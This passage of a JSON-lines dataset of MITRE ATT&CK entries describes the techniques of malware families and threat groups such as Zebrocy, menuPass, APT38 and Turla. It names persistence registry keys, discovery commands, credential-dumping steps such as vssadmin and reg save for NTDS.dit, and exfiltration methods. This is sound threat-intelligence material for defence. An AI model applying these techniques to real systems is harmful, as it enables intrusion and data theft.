via HTTP POST requests.", "Zebrocy executes the <code>reg query</code> command to obtain information in the Registry.", "Zebrocy has a command to delete files and directories.", "Zebrocy performs persistence with a logon script via adding to the Registry key <code>HKCU\\Environment\\UserInitMprLogonScript</code>.", "One variant of Zebrocy uses WMI queries to gather information.", "Zebrocy identifies network drives when they are added to victim systems.", "Zebrocy gets the username from the system.", "Zebrocy decodes its secondary payload and writes it to the victim’s machine. Zebrocy also uses AES and XOR to decrypt strings and payloads.", "Zebrocy runs the <code>ipconfig /all</code> command.", "Zebrocy searches for files that are 60mb and less and contain the following extensions: .doc, .docx, .xls, .xlsx, .ppt, .pptx, .exe, .zip, and .rar. Zebrocy also runs the <code>echo %APPDATA%</code> command to list the contents of the directory. Zebrocy can obtain the current execution path as well as perform drive enumeration. ", "Zebrocy's Delphi variant was packed with UPX.", "Zebrocy enumerates information about connected storage devices.", "Zebrocy scans the system and automatically collects files with the following extensions: .doc, .docx, ,.xls, .xlsx, .pdf, .pptx, .rar, .zip, .jpg, .jpeg, .bmp, .tiff, .kum, .tlg, .sbx, .cr, .hse, .hsf, and .lhz.", "Zebrocy uses SSL and AES ECB for encrypting C2 communications. ", "Zebrocy stores all collected information in a single file before exfiltration.", "Zebrocy installs an application-defined Windows hook to get notified when a network drive has been attached, so it can then use the hook to call its RecordToFile file stealing method.", "A variant of Zebrocy captures screenshots of the victim’s machine in JPEG and BMP format.", "Zebrocy gathers the current time zone and date information from the system.", "Zebrocy obtains additional code to execute on the victim's machine, including the downloading of a secondary payload.", "Zebrocy collects the OS version, computer name and serial number for the storage volume C:\\. Zebrocy also runs the <code>systeminfo</code> command to gather system information. "], "is_subtechnique": false}
{"text": " [BabyShark](https://attack.mitre.org/software/S0414) is a Microsoft Visual Basic (VB) script-based malware family that is believed to be associated with several North Korean campaigns. (Citation: Unit42 BabyShark Feb 2019)", "idx": "https://attack.mitre.org/software/S0414", "title": "BabyShark", "entity": "BabyShark", "entity_type": "software", "entity_context": ["BabyShark has executed the <code>ipconfig /all</code> command.\t", "BabyShark has cleaned up all files associated with the secondary payload execution.", "BabyShark has a PowerShell-based remote administration ability that can implement a PowerShell or C# based keylogger.", "BabyShark has executed the <code>whoami</code> command.", "BabyShark has the ability to decode downloaded files prior to execution.", "BabyShark has used scheduled tasks to maintain persistence.", "BabyShark has executed the <code>ver</code> command.\t", "BabyShark has used mshta.exe to download and execute applications from a remote server.", "BabyShark has executed the <code>tasklist</code> command.\t", "BabyShark has used <code>dir</code> to search for \"programfiles\" and \"appdata\".\t", "BabyShark has encoded data using certutil before exfiltration.", "BabyShark has used cmd.exe to execute commands.\t", "BabyShark has executed the <code>reg query</code> command for <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>.\t", "BabyShark has added a Registry key to ensure all future macros are enabled for Microsoft Word and Excel as well as for additional persistence.", "BabyShark has downloaded additional files from the C2."], "is_subtechnique": false}
{"text": " [Waterbear](https://attack.mitre.org/software/S0579) is modular malware attributed to [BlackTech](https://attack.mitre.org/groups/G0098) that has been used primarily for lateral movement, decrypting, and triggering payloads and is capable of hiding network behaviors.(Citation: Trend Micro Waterbear December 2019)", "idx": "https://attack.mitre.org/software/S0579", "title": "Waterbear", "entity": "Waterbear", "entity_type": "software", "entity_context": ["Waterbear can leverage API functions for execution.", "Waterbear can find the presence of a specific security software.", "Waterbear can hook the <code>ZwOpenProcess</code> and <code>GetExtendedTcpTable</code> APIs called by the process of a security product to hide PIDs and TCP records from detection.", "Waterbear has used RC4 encrypted shellcode.", "Waterbear can receive and load executables from remote C2 servers.", "Waterbear has the ability to decrypt its RC4 encrypted payload for execution.", "Waterbear has used DLL side loading to import and load a malicious DLL loader. ", "Waterbear can identify the process for a specific security product.", "Waterbear can inject decrypted shellcode into the LanmanServer service.", "Waterbear can query the Registry to retrieve data.", "Waterbear can use API hooks on \"GetExtendedTcpTable\" to retrieve a table containing a list of TCP endpoints available to the application. ", "Waterbear can use thread injection to inject shellcode into the process of security software.", "Waterbear can scramble functions not to be executed again with random values."], "is_subtechnique": false}
{"text": " [LiteDuke](https://attack.mitre.org/software/S0513) is a third stage backdoor that was used by [APT29](https://attack.mitre.org/groups/G0016), primarily in 2014-2015. [LiteDuke](https://attack.mitre.org/software/S0513) used the same dropper as [PolyglotDuke](https://attack.mitre.org/software/S0518), and was found on machines also compromised by [MiniDuke](https://attack.mitre.org/software/S0051).(Citation: ESET Dukes October 2019)", "idx": "https://attack.mitre.org/software/S0513", "title": "LiteDuke", "entity": "LiteDuke", "entity_type": "software", "entity_context": ["LiteDuke has the ability to discover the proxy configuration of Firefox and/or Opera.", "LiteDuke has the ability to check for the presence of Kaspersky security software.", "LiteDuke can query the Registry to check for the presence of <code>HKCU\\Software\\KasperskyLab</code>.", "LiteDuke can use HTTP GET requests in C2 communications.", "LiteDuke has used image files to hide its loader component.", "LiteDuke can securely delete files by first writing random data to the file.", "LiteDuke has been packed with multiple layers of encryption.", "LiteDuke can create persistence by adding a shortcut in the <code>CurrentVersion\\Run</code> Registry key.", "LiteDuke has the ability to decrypt and decode multiple layers of obfuscation.", "LiteDuke has the ability to download files.", "LiteDuke can enumerate the CPUID and BIOS version on a compromised system.", "LiteDuke can enumerate the account name on a targeted system.", "LiteDuke can wait 30 seconds before executing additional code if security software is detected."], "is_subtechnique": false}
{"text": " [JPIN](https://attack.mitre.org/software/S0201) is a custom-built backdoor family used by [PLATINUM](https://attack.mitre.org/groups/G0068). Evidence suggests developers of [JPIN](https://attack.mitre.org/software/S0201) and [Dipsind](https://attack.mitre.org/software/S0200) code bases were related in some way. (Citation: Microsoft PLATINUM April 2016)", "idx": "https://attack.mitre.org/software/S0201", "title": "JPIN", "entity": "JPIN", "entity_type": "software", "entity_context": ["JPIN can use the command-line utility cacls.exe to change file permissions.", "JPIN can obtain network information, including DNS, IP, and proxies.", "A JPIN variant downloads the backdoor payload via the BITS service.", "JPIN can communicate over FTP.", "JPIN can list running services.", "JPIN can lower security settings by changing Registry keys.", "JPIN can list running processes.", "JPIN can enumerate Registry keys.", "JPIN checks for the presence of certain security-related processes and deletes its installer/uninstaller component if it identifies any of them.", "JPIN can obtain the permissions of the victim user.", "JPIN can obtain the victim user name.", "JPIN contains a custom keylogger.", "JPIN's installer/uninstaller component deletes itself if it encounters a version of Windows earlier than Windows XP or identifies security-related processes running.", "JPIN can inject content into lsass.exe to load a module.", "JPIN can send email over SMTP.", "JPIN can enumerate drives and their types. It can also change file permissions using cacls.exe.", "JPIN can obtain system information such as OS version and disk space.", "A JPIN uses a encrypted and compressed payload that is disguised as a bitmap within the resource section of the installer.", "JPIN can download files and upgrade itself."], "is_subtechnique": false}
{"text": " [Havij](https://attack.mitre.org/software/S0224) is an automatic SQL Injection tool distributed by the Iranian ITSecTeam security company. Havij has been used by penetration testers and adversaries. (Citation: Check Point Havij Analysis)", "idx": "https://attack.mitre.org/software/S0224", "title": "Havij", "entity": "Havij", "entity_type": "software", "entity_context": ["Havij is used to automate SQL injection."], "is_subtechnique": false}
{"text": " [BOOSTWRITE](https://attack.mitre.org/software/S0415) is a loader crafted to be launched via abuse of the DLL search order of applications used by [FIN7](https://attack.mitre.org/groups/G0046).(Citation: FireEye FIN7 Oct 2019)", "idx": "https://attack.mitre.org/software/S0415", "title": "BOOSTWRITE", "entity": "BOOSTWRITE", "entity_type": "software", "entity_context": ["BOOSTWRITE has used the DWriteCreateFactory() function to load additional modules.", "BOOSTWRITE has been signed by a valid CA.", "BOOSTWRITE has encoded its payloads using a ChaCha stream cipher with a 256-bit key and 64-bit Initialization vector (IV) to evade detection.", "BOOSTWRITE has exploited the loading of the legitimate Dwrite.dll file by actually loading the gdi library, which then loads the gdiplus library and ultimately loads the local Dwrite dll.", "BOOSTWRITE has used a a 32-byte long multi-XOR key to decode data inside its payload.\t"], "is_subtechnique": false}
{"text": " [menuPass](https://attack.mitre.org/groups/G0045) is a threat group that has been active since at least 2006. Individual members of [menuPass](https://attack.mitre.org/groups/G0045) are known to have acted in association with the Chinese Ministry of State Security's (MSS) Tianjin State Security Bureau and worked for the Huaying Haitai Science and Technology Development Company.(Citation: DOJ APT10 Dec 2018)(Citation: District Court of NY APT10 Indictment December 2018) [menuPass](https://attack.mitre.org/groups/G0045) has targeted healthcare, defense, aerospace, finance, maritime, biotechnology, energy, and government sectors globally, with an emphasis on Japanese organizations. In 2016 and 2017, the group is known to have targeted managed IT service providers (MSPs), manufacturing and mining companies, and a university.(Citation: Palo Alto menuPass Feb 2017)(Citation: Crowdstrike CrowdCast Oct 2013)(Citation: FireEye Poison Ivy)(Citation: PWC Cloud Hopper April 2017)(Citation: FireEye APT10 April 2017)(Citation: DOJ APT10 Dec 2018)(Citation: District Court of NY APT10 Indictment December 2018)", "idx": "https://attack.mitre.org/groups/G0045", "title": "menuPass", "entity": "menuPass", "entity_type": "groups", "entity_context": ["menuPass has used native APIs including <code>GetModuleFileName</code>, <code>lstrcat</code>, <code>CreateFile</code>, and <code>ReadFile</code>.", "menuPass has used Putty Secure Copy Client (PSCP) to transfer data.", "menuPass has encrypted files and information before exfiltration.", "menuPass has attempted to get victims to open malicious files such as Windows Shortcuts (.lnk) and/or Microsoft Office documents, sent via email as part of spearphishing campaigns.", "A menuPass macro deletes files after it has decoded and decompressed them.", "menuPass has used the Csvde tool to collect Active Directory files and data.", "menuPass has installed updates and new malware on victims.", "menuPass has collected data from remote systems by mounting network shares with <code>net use</code> and using Robocopy to transfer data.", "menuPass has used and modified open-source tools like Impacket, Mimikatz, and pwdump.", "menuPass has renamed certutil and moved it to a different location on the system to avoid detection based on use of the tool.", "menuPass has used esentutl to change file extensions to their true type that were masquerading as .txt files. ", "menuPass has searched compromised systems for folders of interest including those related to HR, audit and expense, and meeting memos.", "menuPass has used <code>net use</code> to conduct connectivity checks to machines.", "menuPass has used legitimate access granted to Managed Service Providers in order to access victims of interest.", "menuPass has used valid accounts including shared between Managed Service Providers and clients to move between the two environments.", "menuPass has used process hollowing in iexplore.exe to load the RedLeaves implant.", "menuPass has used <code>InstallUtil.exe</code> to execute malicious software.", "menuPass has registered malicious domains for use in intrusion campaigns.", "menuPass has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as UPPERCUT.", "menuPass has been seen changing malicious files to appear legitimate.", "menuPass has compressed files before exfiltration using TAR and RAR.", "menuPass has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.", "menuPass has resized and added data to the certificate table to enable the signing of modified files with legitimate signatures.", "menuPass has used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions.", "menuPass has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40.", "menuPass has used tcping.exe, similar to Ping, to probe port status on systems of interest.", "menuPass uses PowerSploit to inject shellcode into PowerShell.", "menuPass has used DLL search order hijacking.", "menuPass has collected various files from the compromised computers.\n", "menuPass has used the Microsoft administration tool csvde.exe to export Active Directory data.", "menuPass has used Ntdsutil to dump credentials.", "menuPass has used Wevtutil to remove PowerShell execution logs.", "menuPass has used RDP connections to move across the victim network.", "menuPass has used key loggers to steal usernames and passwords.", "menuPass uses scripts to enumerate IP ranges on the victim network. menuPass has also issued the command <code>net view /domain</code> to a PlugX implant to gather information about remote systems on the network.", "menuPass has leveraged vulnerabilities in Pulse Secure VPNs to hijack sessions.", "menuPass executes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands. menuPass has used malicious macros embedded inside Office documents to execute files.", "menuPass has used a global service provider's IP as a proxy for C2 traffic from a victim.", "menuPass has staged data on remote MSP systems or other victim networks prior to exfiltration.", "menuPass has used tools to exploit the ZeroLogon vulnerability (CVE-2020-1472).", "menuPass has sent malicious Office documents via email as part of spearphishing campaigns as well as executables disguised as documents.", "menuPass has used a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using WMI.", "menuPass stages data prior to exfiltration in multi-part archives, often saved in the Recycle Bin.", "menuPass has used dynamic DNS service providers to host malicious domains.", "menuPass has used certutil in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has also used <code>certutil -decode</code> to decode files on the victim’s machine when dropping UPPERCUT.", "menuPass has used a script (atexec.py) to execute a command on a target machine via Task Scheduler."], "is_subtechnique": false}
{"text": " APT38 is a financially-motivated group linked to North Korean cyber espionage operators, renown for carrying out heists against financial entities and brazen use of destructive malware.", "idx": "https://attack.mitre.org/groups/G0082", "title": "APT38", "entity": "APT38", "entity_type": "groups", "entity_context": ["APT38 has collected data from a compromised host.", "APT38 has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.", "APT38 has modified data timestamps to mimic files that are in the same folder on a compromised host.", "APT38 has installed a new Windows service to establish persistence.", "APT38 has used PowerShell to execute commands and other operational tasks.", "APT38 has conducted watering holes schemes to gain initial access to victims.", "APT38 has used a custom MBR wiper named BOOTWRECK, which will initiate a system reboot after wiping the victim's MBR.", "APT38 has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable.", "APT38 uses a tool called CLEANTOAD that has the capability to modify Registry keys.", "APT38 installed a port monitoring tool, MAPMAKER, to print the active TCP connections on the local system.", "APT38 has used a command-line tunneler, NACHOCHEESE, to give them shell access to a victim’s machine.", "APT38  has attempted to lure victims into enabling malicious macros within email attachments.", "APT38 used a backdoor, NESTEGG, that has the capability to download and upload files to and from a victim’s machine.", "APT38 has used DYEPACK.FOX to manipulate PDF data as it is accessed to remove traces of fraudulent SWIFT transactions from the data displayed to the end user.", "APT38 has used several code packing methods such as Themida, Enigma, VMProtect, and Obsidium, to pack their implants.", "APT38 has used a custom MBR wiper named BOOTWRECK to render systems inoperable.", "APT38 used a Trojan called KEYLIME to collect data from the clipboard.", "APT38 has prepended a space to all of their terminal commands to operate without leaving traces in the HISTCONTROL environment.", "APT38 has enumerated network shares on a compromised host.", "APT38 have enumerated files and directories, or searched in specific locations within a compromised host.", "APT38 has conducted spearphishing campaigns using malicious email attachments.", "APT38 used a backdoor, QUICKRIDE, to communicate to the C2 server over HTTP and HTTPS.", "APT38 has used a custom secure delete function to make deleted files unrecoverable.", "APT38 clears Window Event logs and Sysmon logs from the system.", "APT38 has used cron to create pre-scheduled and periodic background jobs on a Linux system.", "APT38 has created new services or modified existing ones to run executables, commands, or scripts.", "APT38 has used the Windows API to execute code within a victim's system. ", "APT38 has used DYEPACK to manipulate SWIFT messages en route to a printer.", "APT38 has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users.", "APT38 leveraged Sysmon to understand the processes, services in the organization.", "APT38 used a Trojan called KEYLIME to capture keystrokes from the victim’s machine.", "APT38 has used web shells for persistence or to ensure redundant access.", "APT38 has identified security software, configurations, defensive tools, and sensors installed on a compromised system.", "APT38 has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.", "APT38 has obtained and used open-source tools such as Mimikatz.", "APT38 have created firewall exemptions on specific ports, including ports 443, 6443, 8443, and 9443.", "APT38 has used Task Scheduler to run programs at system startup or on a scheduled basis for persistence.", "APT38 has used Hermes ransomware to encrypt files with AES256.", "APT38 has used DYEPACK to create, delete, and alter records in databases used for SWIFT transactions.", "APT38 has used a utility called CLOSESHAVE that can securely delete a file from the system. They have also removed malware, tools, or other non-native files used during the intrusion to reduce their footprint or as part of the post-intrusion cleanup process.", "APT38 has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs.", "APT38 has used VBScript to execute commands and other operational tasks."], "is_subtechnique": false}
{"text": " [Mustang Panda](https://attack.mitre.org/groups/G0129) is a China-based cyber espionage threat actor that was first observed in 2017 but may have been conducting operations since at least 2014. [Mustang Panda](https://attack.mitre.org/groups/G0129) has targeted government entities, nonprofits, religious, and other non-governmental organizations in the U.S., Germany, Mongolia, Myanmar, Pakistan, and Vietnam, among others.(Citation: Crowdstrike MUSTANG PANDA June 2018)(Citation: Anomali MUSTANG PANDA October 2019)(Citation: Secureworks BRONZE PRESIDENT December 2019)", "idx": "https://attack.mitre.org/groups/G0129", "title": "Mustang Panda", "entity": "Mustang Panda", "entity_type": "groups", "entity_context": ["Mustang Panda has used <code>InstallUtil.exe</code> to execute a malicious Beacon stager.", "Mustang Panda has executed PowerShell scripts via WMI.", "Mustang Panda has installed TeamViewer on targeted systems.", "Mustang Panda has used a legitimately signed executable to execute a malicious payload within a DLL file.", "Mustang Panda has used a customized PlugX variant which could exfiltrate documents from air-gapped networks.", "Mustang Panda has encrypted C2 communications with RC4.", "Mustang Panda has communicated with its C2 via HTTP POST requests.", "Mustang Panda has exploited CVE-2017-0199 in Microsoft Word to execute code.", "Mustang Panda has executed HTA files via cmd.exe, and used batch scripts for collection.", "Mustang Panda has sent malicious files requiring direct victim interaction to execute.", "Mustang Panda has delivered spearphishing links to their target.", "Mustang Panda has used <code>ipconfig</code> and <code>arp</code> to determine network configuration information.", "Mustang Panda has used <code>tasklist /v</code> to determine active process information.\t", "Mustang Panda has used malicious PowerShell scripts to enable execution.", "Mustang Panda has encrypted documents with RC4 prior to exfiltration.", "Mustang Panda has created the registry key <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\AdobelmdyU</code> to maintain persistence.", "Mustang Panda has sent malicious links directing victims to a Google Drive folder.", "Mustang Panda has used a customized PlugX variant which could spread through USB connections.", "Mustang Panda has searched the victim system for the <code>InstallUtil.exe</code> program and its version.", "Mustang Panda has used RAR to create password-protected archives of collected documents prior to exfiltration.", "Mustang Panda has used 'adobeupdate.dat' as a PlugX loader, and a file named 'OneDrive.exe' to load a Cobalt Strike payload.", "Mustang Panda's PlugX variant has created a hidden folder on USB drives named <code>RECYCLE.BIN</code> to store malicious executables and collected data.", "Mustang Panda has embedded VBScript components in LNK files to download additional files and automate collection.", "Mustang Panda has used junk code within their DLL files to hinder analysis.", "Mustang Panda has used mshta.exe to launch collection scripts.", "Mustang Panda has used vssadmin to create a volume shadow copy and retrieve the NTDS.dit file. Mustang Panda has also used <code>reg save</code> on the SYSTEM file Registry location to help extract the NTDS.dit file.", "Mustang Panda has used an additional filename extension to hide the true file type.", "Mustang Panda has gathered system information using <code>systeminfo</code>.", "Mustang Panda has stored collected credential files in <code>c:\\windows\\temp</code> prior to exfiltration. Mustang Panda has also stored documents for exfiltration in a hidden folder on USB drives.", "Mustang Panda has downloaded additional executables following the initial infection stage.", "Mustang Panda's custom ORat tool uses a WMI event consumer to maintain persistence.", "Mustang Panda have acquired C2 domains prior to operations.", "Mustang Panda has used spearphishing attachments to deliver initial access payloads.", "Mustang Panda has used <code>netstat -ano</code> to determine network connection information.", "Mustang Panda has delivered initial payloads hidden using archives and encoding measures.", "Mustang Panda has created a scheduled task to execute additional malicious software, as well as maintain persistence.", "Mustang Panda has searched the entire target system for DOC, DOCX, PPT, PPTX, XLS, XLSX, and PDF files.", "Mustang Panda will delete their tools and files, and kill processes after their objectives are reached.", "Mustang Panda used custom batch scripts to collect files automatically from a targeted system."], "is_subtechnique": false}
{"text": " [Tropic Trooper](https://attack.mitre.org/groups/G0081) is an unaffiliated threat group that has led targeted campaigns against targets in Taiwan, the Philippines, and Hong Kong. [Tropic Trooper](https://attack.mitre.org/groups/G0081) focuses on targeting government, healthcare, transportation, and high-tech industries and has been active since 2011.(Citation: TrendMicro Tropic Trooper Mar 2018)(Citation: Unit 42 Tropic Trooper Nov 2016)(Citation: TrendMicro Tropic Trooper May 2020)", "idx": "https://attack.mitre.org/groups/G0081", "title": "Tropic Trooper", "entity": "Tropic Trooper", "entity_type": "groups", "entity_context": ["Tropic Trooper can search for anti-virus software running on the system.", "Tropic Trooper has installed a service pointing to a malicious DLL dropped to disk.", "Tropic Trooper has executed commands through Microsoft security vulnerabilities, including CVE-2017-11882, CVE-2018-0802, and CVE-2012-0158.", "Tropic Trooper has created shortcuts in the Startup folder to establish persistence.", "Tropic Trooper has created the Registry key <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> and sets the value to establish persistence.", "Tropic Trooper has used multiple Windows APIs including HttpInitialize, HttpCreateHttpHandle, and HttpAddUrl.", "Tropic Trooper has used a delivered trojan to download additional files.", "Tropic Trooper has attempted to transfer USBferry from an infected USB device by copying an Autorun function to the target machine.", "Tropic Trooper has collected information automatically using the adversary's USBferry attack.\t", "Tropic Trooper used <code>letmein</code> to scan for saved usernames on the target system.", "Tropic Trooper has used base64 encoding to hide command strings delivered from the C2.", "Tropic Trooper has used known administrator account credentials to execute the backdoor directly.\t", "Tropic Trooper has lured victims into executing malware via malicious e-mail attachments.", "Tropic Trooper used <code>netview</code> to scan target systems for shared resources.", "Tropic Trooper has tested if the localhost network is available and other connection capability on an infected system using command scripts.\t", "Tropic Trooper's backdoor could list the infected system's installed software.", "Tropic Trooper sent spearphishing emails that contained malicious Microsoft Office and fake installer file attachments.", "Tropic Trooper has used Windows command scripts.\t", "Tropic Trooper has detected a target system’s OS version and system volume information.", "Tropic Trooper has encrypted traffic with the C2 to prevent network detection.", "Tropic Trooper has used JPG files with encrypted payloads to mask their backdoor routines and evade detection.", "Tropic Trooper has been known to side-load DLLs using a valid version of a Windows Address Book and Windows Defender executable with one of their tools.", "Tropic Trooper's backdoor has communicated to the C2 over the DNS protocol.\t", "Tropic Trooper has monitored files' modified time.\t", "Tropic Trooper has created a hidden directory under <code>C:\\ProgramData\\Apple\\Updates\\</code> and <code>C:\\Users\\Public\\Documents\\Flash\\</code>.", "Tropic Trooper used <code>pr</code> and an openly available tool to scan for open ports on target systems.", "Tropic Trooper used shellcode with an XOR algorithm to decrypt a payload. Tropic Trooper also decrypted image files which contained a payload.", "Tropic Trooper has started a web service in the target host and wait for the adversary to connect, acting as a web shell.\t", "Tropic Trooper has encrypted configuration files.", "Tropic Trooper is capable of enumerating the running processes on the system using <code>pslist</code>.", "Tropic Trooper has used HTTP in communication with the C2.", "Tropic Trooper has injected a DLL backdoor into dllhost.exe and svchost.exe.", "Tropic Trooper has used a copy function to automatically exfiltrate sensitive data from air-gapped systems using USB storage.\t", "Tropic Trooper has used scripts to collect the host's network topology.\t", "Tropic Trooper has hidden payloads in Flash directories and fake installer files.", "Tropic Trooper has exfiltrated data using USB storage devices.\t", "Tropic Trooper has deleted dropper files on an infected system using command scripts.\t", "Tropic Trooper has used SSL to connect to C2 servers.", "Tropic Trooper delivered malicious documents with the XLSX extension, typically used by OpenXML documents, but the file itself was actually an OLE (XLS) document."], "is_subtechnique": false}
{"text": " [TA505](https://attack.mitre.org/groups/G0092) is a financially motivated threat group that has been active since at least 2014. The group is known for frequently changing malware and driving global trends in criminal malware distribution.(Citation: Proofpoint TA505 Sep 2017)(Citation: Proofpoint TA505 June 2018)(Citation: Proofpoint TA505 Jan 2019)", "idx": "https://attack.mitre.org/groups/G0092", "title": "TA505", "entity": "TA505", "entity_type": "groups", "entity_context": ["TA505 has used the tool EmailStealer to steal and send lists of e-mail addresses to a remote server.", "TA505 has downloaded additional malware to execute on victim systems.", "TA505 has used HTTP to communiate with C2 nodes.", "TA505 has used malware to gather credentials from Internet Explorer.", "TA505 has used <code>msiexec</code> to download and execute malicious Windows Installer files.", "TA505 has used TinyMet to enumerate members of privileged groups. TA505 has also run <code>net group /domain</code>.", "TA505 has used .iso files to deploy malicious .lnk files.", "TA505 has executed commands using <code>cmd.exe</code>.", "TA505 has used UPX to obscure malicious code.", "TA505 has sent spearphishing emails containing malicious links.", "TA505 has used spearphishing emails with malicious attachments to initially compromise victims.", "TA505 has used PowerShell to download and execute malware and reconnaissance scripts.", "TA505 has used lures to get users to click links in emails and attachments. For example, TA505 makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files. ", "TA505 has leveraged <code>rundll32.exe</code> to execute malicious DLLs.", "TA505 has used JavaScript for code execution.", "TA505 has used fast flux to mask botnets by distributing payloads across multiple IPs.", "TA505 has password-protected malicious Word documents and used base64 encoded PowerShell commands.", "TA505 has used malware to gather credentials from FTP clients and Outlook.", "TA505 has used VBS for code execution.", "TA505 has been seen injecting a DLL into winword.exe.", "TA505 has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives. For example, TA505 makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files. ", "TA505 has signed payloads with code signing certificates from Thawte and Sectigo.", "TA505 has used a wide variety of ransomware, such as Locky, Jaff, Bart, Philadelphia, and GlobeImposter, to encrypt victim files and demand a ransom payment.", "TA505 has leveraged malicious Word documents that abused DDE.", "TA505 has used stolen domain admin accounts to compromise additional hosts."], "is_subtechnique": false}
{"text": " [Turla](https://attack.mitre.org/groups/G0010) is a Russian-based threat group that has infected victims in over 45 countries, spanning a range of industries including government, embassies, military, education, research and pharmaceutical companies since 2004. Heightened activity was seen in mid-2015. [Turla](https://attack.mitre.org/groups/G0010) is known for conducting watering hole and spearphishing campaigns and leveraging in-house tools and malware. [Turla](https://attack.mitre.org/groups/G0010)’s espionage platform is mainly used against Windows machines, but has also been seen used against macOS and Linux machines.(Citation: Kaspersky Turla)(Citation: ESET Gazer Aug 2017)(Citation: CrowdStrike VENOMOUS BEAR)(Citation: ESET Turla Mosquito Jan 2018)", "idx": "https://attack.mitre.org/groups/G0010", "title": "Turla", "entity": "Turla", "entity_type": "groups", "entity_context": ["Turla surveys a system upon check-in to discover network configuration details using the <code>arp -a</code>, <code>nbtstat -n</code>, <code>net config</code>, <code>ipconfig /all</code>, and <code>route</code> commands, as well as NBTscan. Turla RPC backdoors have also retrieved registered RPC interface information from process memory.", "Turla has used encryption (including salted 3DES via PowerSploit's <code>Out-EncryptedScript.ps1</code>), random variable names, and base64 encoding to obfuscate PowerShell commands and payloads.", "Turla has encrypted files stolen from connected USB drives into a RAR file before exfiltration.", "A Turla Javascript backdoor added a local_update_check value under the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> to establish persistence. Additionally, a Turla custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.", "Turla has obtained and customized publicly-available tools like Mimikatz.", "Turla has used malware obtained after compromising other threat actors, such as OilRig.", "Turla has used <code>net group \"Domain Admins\" /domain</code> to identify domain administrators.", "Turla has used various JavaScript-based backdoors.\t", "Turla has used HTTP and HTTPS for C2 communications.", "Turla surveys a system upon check-in to discover running services and associated processes using the <code>tasklist /svc</code> command.", "Turla has used WMI event filters and consumers to establish persistence.", "Turla has developed its own unique malware for use in operations.", "Turla has used the VPS infrastructure of compromised Iranian threat actors.", "Turla has used <code>tracert</code> to check internet connectivity.", "Turla has used WebDAV to upload stolen USB files to a cloud drive. Turla has also exfiltrated stolen files to OneDrive and 4shared.", "Turla has used a custom decryption routine, which pulls key and salt values from other artifacts such as a WMI filter or PowerShell Profile, to decode encrypted PowerShell payloads.", "Turla attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.", "Turla has used shellcode to download Meterpreter after compromising a victim.", "Turla has used a custom .NET tool to collect documents from an organization's internal central database.", "Turla established persistence by adding a Shell value under the Registry key <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</code>.", "Turla has used <code>net user /domain</code> to enumerate domain accounts.", "Turla has used <code>net accounts</code> and <code>net accounts /domain</code> to acquire password policy information.", "Turla RPC backdoors have included local UPnP RPC proxies.\t", "Turla and its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes.", "Turla RPC backdoors can upload files from victim machines.", "Turla has frequently used compromised WordPress sites for C2 infrastructure.", "Turla surveys a system upon check-in to discover operating system configuration details using the <code>systeminfo</code> and <code>set</code> commands.", "Turla has exploited vulnerabilities in the VBoxDrv.sys driver to obtain kernel mode privileges.", "Turla has used <code>net localgroup</code> and <code>net localgroup Administrators</code> to enumerate group information, including members of the local administrators group.", "Turla has used the Registry to store encrypted payloads.", "Turla surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, the Program Files directory, and Recent. Turla RPC backdoors have also searched for files matching the <code>lPH*.dll</code> pattern.", "Turla has used spearphishing via a link to get users to download and run their malware.", "Turla has used PowerShell profiles to maintain persistence on an infected machine.", "Turla surveys a system upon check-in to discover remote systems on a local network using the <code>net view</code> and <code>net view /DOMAIN</code> commands. Turla has also used <code>net group \"Domain Computers\" /domain</code>, <code>net group \"Domain Controllers\" /domain</code>, and <code>net group \"Exchange Servers\" /domain</code> to enumerate domain computers, including the organization's DC and Exchange Server.", "Turla has gathered credentials from the Windows Credential Manager tool.\t", "Turla surveys a system upon check-in to discover active local network connections using the <code>netstat -an</code>, <code>net use</code>, <code>net file</code>, and <code>net session</code> commands. Turla RPC backdoors have also enumerated the IPv4 TCP connection table via the <code>GetTcpTable2</code> API call.", "Turla has abused local accounts that have the same password across the victim’s network.", "Turla has used IronPython scripts as part of the IronNetInjector toolchain to drop payloads.", "Turla used <code>net use</code> commands to connect to lateral systems within a network.", "Turla has used <code>fsutil fsinfo drives</code> to list connected drives.", "Turla may attempt to connect to systems within a victim's network using <code>net use</code> commands and a predefined list or collection of passwords.", "Turla surveys a system upon check-in to discover running processes using the <code>tasklist /v</code> command. Turla RPC backdoors have also enumerated processes associated with specific open ports or named pipes.", "Turla RPC backdoors can impersonate or steal process tokens before executing commands.\t", "Turla surveys a system upon check-in to discover Group Policy details using the <code>gpresult</code> command.", "Turla has used compromised servers as infrastructure.", "Turla has obtained information on security software, including security logging information that may indicate whether their malware has been detected.", "Turla has also used PowerSploit's <code>Invoke-ReflectivePEInjection.ps1</code> to reflectively load a PowerShell payload into a random process on the victim system.", "Turla has modified variables in kernel memory to turn off Driver Signature Enforcement after exploiting vulnerabilities that obtained kernel mode privileges.", "Based on comparison of Gazer versions, Turla made an effort to obfuscate strings in the malware that could be used as 